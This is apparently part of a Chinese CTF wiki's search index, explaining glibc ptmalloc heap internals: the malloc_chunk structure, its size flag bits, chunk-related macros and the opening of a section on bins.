            "text": "\u5728\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u79f0\u7531 malloc \u7533\u8bf7\u7684\u5185\u5b58\u4e3a chunk \u3002\u8fd9\u5757\u5185\u5b58\u5728 ptmalloc \u5185\u90e8\u7528 malloc_chunk \u7ed3\u6784\u4f53\u6765\u8868\u793a\u3002\u5f53\u7a0b\u5e8f\u7533\u8bf7\u7684 chunk \u88ab free \u540e\uff0c\u4f1a\u88ab\u52a0\u5165\u5230\u76f8\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u5217\u8868\u4e2d\u3002  \u975e\u5e38\u6709\u610f\u601d\u7684\u662f\uff0c \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784 \u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002  malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b  /*    This struct declaration is misleading (but accurate and necessary).    It declares a  view  into memory allowing access to necessary    fields at known offsets from a given base. See explanation below.  */  struct   malloc_chunk   { \n\n   INTERNAL_SIZE_T        prev_size ;    /* Size of previous chunk (if free).  */ \n   INTERNAL_SIZE_T        size ;         /* Size in bytes, including overhead. */ \n\n   struct   malloc_chunk *   fd ;           /* double links -- used only if free. */ \n   struct   malloc_chunk *   bk ; \n\n   /* Only used for large blocks: pointer to next larger size.  */ \n   struct   malloc_chunk *   fd_nextsize ;   /* double links -- used only if free. */ \n   struct   malloc_chunk *   bk_nextsize ;  };   \u9996\u5148\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e9b\u5fc5\u8981\u7684\u89e3\u91ca INTERNAL_SIZE_T\uff0cSIZE_SZ\uff0cMALLOC_ALIGN_MASK\uff1a  /* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of     chunk sizes.     The default version is the same as size_t.     While not strictly necessary, it is best to define this as an     unsigned type, even if size_t is a signed type. This may avoid some     artificial size limitations on some systems.     On a 64-bit machine, you may be able to reduce malloc overhead by     defining INTERNAL_SIZE_T to be a 32 bit `unsigned int  at the     expense of not being able to handle more than 2^32 of malloced     space. If this limitation is acceptable, you are encouraged to set     this unless you are on a platform requiring 16byte alignments. In     this case the alignment requirements turn out to negate any     potential advantages of decreasing size_t word size.     Implementors: Beware of the possible combinations of:       - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,         and might be the same width as int or as long       - size_t might have different width and signedness as INTERNAL_SIZE_T       - int and long might be 32 or 64 bits, and might be the same width     To deal with this, most comparisons and difference computations     among INTERNAL_SIZE_Ts should cast them to unsigned long, being     aware of the fact that casting an unsigned int to a wider long does     not sign-extend. (This also makes checking for negative numbers     awkward.) Some of these casts result in harmless compiler warnings     on some systems.  */  #ifndef INTERNAL_SIZE_T  # define INTERNAL_SIZE_T size_t  #endif  /* The corresponding word size.  */  #define SIZE_SZ (sizeof (INTERNAL_SIZE_T))  /* The corresponding bit mask value.  */  #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)   \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002  \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b   prev_size ,  \u5982\u679c\u8be5 chunk \u7684 \u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00chunk\u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f(\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2achunk \u7684\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk  \u3002  size  \uff0c\u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a  NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1\u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0\u8868\u793a\u5c5e\u4e8e\u3002  IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002   PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684P\u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2chunk\u4e4b\u95f4\u7684\u5408\u5e76\u3002    fd\uff0cbk \u3002 chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b  fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk  bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk  \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406    fd_nextsize\uff0c bk_nextsize \uff0c\u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002  fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002  bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002  \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002     \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3auser data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411user data\u7684\u8d77\u59cb\u5904\u3002    \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524dchunk\u4f7f\u7528\u3002 \u8fd9\u5c31\u662fchunk\u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   previous   chunk ,   if   unallocated   ( P   clear )    | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   chunk ,   in   bytes                       | A | M | P | \n   mem -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               User   data   starts   here ...                            . \n         .                                                                 . \n         .               ( malloc_usable_size ()   bytes )                        .  next      .                                                                 |  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               ( size   of   chunk ,   but   used   for   application   data )      | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   next   chunk ,   in   bytes                  | A | 0 | 1 | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   \u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   previous   chunk ,   if   unallocated   ( P   clear )    | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ` head :   |               Size   of   chunk ,   in   bytes                       | A | 0 | P | \n   mem -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Forward   pointer   to   next   chunk   in   list               | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Back   pointer   to   previous   chunk   in   list              | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Unused   space   ( may   be   0   bytes   long )                  . \n         .                                                                 . \n  next     .                                                                 |  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ` foot :   |               Size   of   chunk ,   in   bytes                             | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   next   chunk ,   in   bytes                  | A | 0 | 0 | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f    \u672c\u8eab\u7684size\u5b57\u6bb5\u4f1a\u8bb0\u5f55\uff0c    \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002    \u4e00\u822c\u60c5\u51b5\u4e0b \uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002  \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01  /*      The three exceptions to all this are:       1. The special chunk `top  doesn t bother using the      trailing size field since there is no next contiguous chunk      that would have to index off it. After initialization, `top      is forced to always exist.  If it would become less than      MINSIZE bytes long, it is replenished.       2. Chunks allocated via mmap, which have the second-lowest-order      bit M (IS_MMAPPED) set in their size fields.  Because they are      allocated one-by-one, each must contain its own trailing size      field.  If the M bit is set, the other bits are ignored      (because mmapped chunks are neither in an arena, nor adjacent      to a freed chunk).  The M bit is also used for chunks which      originally came from a dumped heap via malloc_set_state in      hooks.c.       3. Chunks in fastbins are treated as allocated chunks from the      point of view of the chunk allocator.  They are consolidated      with their neighbors only in bulk, in malloc_consolidate.  */", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#chunk", 
            "text": "\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002  chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362  mem\u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002  /* conversion from malloc headers to user pointers, and back */  #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))  #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))   \u6700\u5c0f\u7684 chunk \u5927\u5c0f  /* The smallest possible chunk */  #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))   \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002  \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f  \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002  \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002  /* The smallest size we can malloc is an aligned minimal chunk */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define MINSIZE                                                                \\      (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK)                     \\                        ~MALLOC_ALIGN_MASK))   \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50  2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002  /* Check if m has acceptable alignment */  // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define aligned_OK(m) (((unsigned long) (m)   MALLOC_ALIGN_MASK) == 0)  #define misaligned_chunk(p)                                                    \\      ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p))         \\       MALLOC_ALIGN_MASK)   \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad  /*     Check if a request is so large that it would wrap around zero when     padded and aligned. To simplify some other code, the bound is made     low enough so that adding MINSIZE will also not wrap around zero.   */  #define REQUEST_OUT_OF_RANGE(req)                                              \\      ((unsigned long) (req)  = (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))   \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f  /* pad request bytes into a usable size -- internal version */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define request2size(req)                                                      \\      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK   MINSIZE)                           \\           ? MINSIZE                                                             \\           : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK)  /*  Same, except also perform argument check */  #define checked_request2size(req, sz)                                          \\      if (REQUEST_OUT_OF_RANGE(req)) {                                           \\          __set_errno(ENOMEM);                                                   \\          return 0;                                                              \\      }                                                                          \\      (sz) = request2size(req);   \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b   \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002  \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8echunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002  \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914dMINSIZE\u5b57\u8282\u3002  \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0aMALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002   \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002  \u6807\u8bb0\u4f4d\u76f8\u5173  /* size field is or ed with PREV_INUSE when previous adjacent chunk in use */  #define PREV_INUSE 0x1  /* extract inuse bit of previous chunk */  #define prev_inuse(p) ((p)- mchunk_size   PREV_INUSE)  /* size field is or ed with IS_MMAPPED if the chunk was obtained with mmap() */  #define IS_MMAPPED 0x2  /* check for mmap() ed chunk */  #define chunk_is_mmapped(p) ((p)- mchunk_size   IS_MMAPPED)  /* size field is or ed with NON_MAIN_ARENA if the chunk was obtained     from a non-main arena.  This is only set immediately before handing     the chunk to the user, if necessary.  */  #define NON_MAIN_ARENA 0x4  /* Check for chunk from main arena.  */  #define chunk_main_arena(p) (((p)- mchunk_size   NON_MAIN_ARENA) == 0)  /* Mark a chunk as not being on the main arena.  */  #define set_non_main_arena(p) ((p)- mchunk_size |= NON_MAIN_ARENA)  /*     Bits to mask off when extracting size     Note: IS_MMAPPED is intentionally not masked off from size field in     macros for which mmapped chunks should never be seen. This should     cause helpful core dumps to occur if it is tried by accident by     people extending or adapting this malloc.   */  #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   \u83b7\u53d6chunk size  /* Get size, ignoring use bits */  #define chunksize(p) (chunksize_nomask(p)   ~(SIZE_BITS))  /* Like chunksize, but do not mask SIZE_BITS.  */  #define chunksize_nomask(p) ((p)- mchunk_size)   \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684chunk  /* Ptr to next physical malloc_chunk. */  #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))   \u83b7\u53d6\u524d\u4e00\u4e2achunk\u7684\u4fe1\u606f  /* Size of the chunk below P.  Only valid if prev_inuse (P).  */  #define prev_size(p) ((p)- mchunk_prev_size)  /* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */  #define set_prev_size(p, sz) ((p)- mchunk_prev_size = (sz))  /* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */  #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))   \u5f53\u524dchunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c  /* extract p s inuse bit */  #define inuse(p)                                                               \\      ((((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size)   PREV_INUSE)  /* set/clear chunk as being inuse without otherwise disturbing */  #define set_inuse(p)                                                           \\      ((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size |= PREV_INUSE  #define clear_inuse(p)                                                         \\      ((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size  = ~(PREV_INUSE)   \u8bbe\u7f6echunk\u7684size\u5b57\u6bb5  /* Set size at head, without disturbing its use bit */  // SIZE_BITS = 7  #define set_head_size(p, s)                                                    \\      ((p)- mchunk_size = (((p)- mchunk_size   SIZE_BITS) | (s)))  /* Set size/use field */  #define set_head(p, s) ((p)- mchunk_size = (s))  /* Set size at footer (only when chunk is not in use) */  #define set_foot(p, s)                                                         \\      (((mchunkptr)((char *) (p) + (s)))- mchunk_prev_size = (s))   \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684chunk  /* Treat space at ptr + offset as a chunk */  #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))   \u6307\u5b9a\u504f\u79fb\u5904chunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c  /* check/set/clear inuse bits in known places */  #define inuse_bit_at_offset(p, s)                                              \\      (((mchunkptr)(((char *) (p)) + (s)))- mchunk_size   PREV_INUSE)  #define set_inuse_bit_at_offset(p, s)                                          \\      (((mchunkptr)(((char *) (p)) + (s)))- mchunk_size |= PREV_INUSE)  #define clear_inuse_bit_at_offset(p, s)                                        \\      (((mchunkptr)(((char *) (p)) + (s)))- mchunk_size  = ~(PREV_INUSE))", 
            "title": "chunk\u76f8\u5173\u5b8f"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#bin", 
            "text": "", 
            "title": "bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_4", 
            "text": "\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684chunk\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002  \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a4\u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk\u3002  \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cPtmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9bbin\u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b  #define NBINS 128  /* Normal bins packed as described above */  